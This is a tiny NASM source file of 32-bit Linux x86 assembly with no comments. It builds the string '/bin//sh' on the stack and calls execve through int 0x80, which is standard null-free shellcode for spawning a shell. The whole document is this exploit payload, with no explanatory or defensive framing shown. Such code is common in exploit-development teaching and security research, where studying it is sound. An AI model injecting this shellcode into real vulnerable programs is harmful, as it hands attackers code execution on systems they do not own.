BITS 32
global _start

_start:
    xor eax, eax
    mov al, 11
    xor ecx, ecx
    xor edx, edx
    push ecx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    int 0x80
